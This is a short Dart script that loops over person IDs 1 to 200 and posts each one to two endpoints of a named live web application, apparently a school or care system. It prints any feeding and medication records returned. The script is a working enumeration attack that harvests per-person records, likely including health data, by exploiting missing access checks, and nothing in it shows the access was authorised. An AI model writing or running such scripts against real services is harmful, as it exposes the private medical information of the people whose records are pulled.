import 'dart:convert';
import 'package:http/http.dart' as http;

void main() async {
  final url = Uri.parse('https://educaysoft.org/sica/index.php/alimentacion/alimentacion_personaflutter');
  final futures = <Future>[];
  for (int i = 1; i <= 200; i++) {
    futures.add(() async {
      try {
        final response = await http.post(url, body: {'idpersona': i.toString()});
        final decoded = json.decode(response.body);
        if (decoded is Map && decoded['data'] != null && (decoded['data'] as List).isNotEmpty) {
          print("ID $i ALIMENTACION DATA: ${response.body}");
        } else if (decoded is List && decoded.isNotEmpty) {
          print("ID $i ALIMENTACION DATA: ${response.body}");
        }
      } catch (e) {}
    }());
  }
  await Future.wait(futures);

  final urlMed = Uri.parse('https://educaysoft.org/sica/index.php/medicacion/medicacion_personaflutter');
  final futuresMed = <Future>[];
  for (int i = 1; i <= 200; i++) {
    futuresMed.add(() async {
      try {
        final response = await http.post(urlMed, body: {'idpersona': i.toString()});
        final decoded = json.decode(response.body);
        if (decoded is Map && decoded['data'] != null && (decoded['data'] as List).isNotEmpty) {
          print("ID $i MEDICACION DATA: ${response.body}");
        } else if (decoded is List && decoded.isNotEmpty) {
          print("ID $i MEDICACION DATA: ${response.body}");
        }
      } catch (e) {}
    }());
  }
  await Future.wait(futuresMed);
  print("DONE.");
}
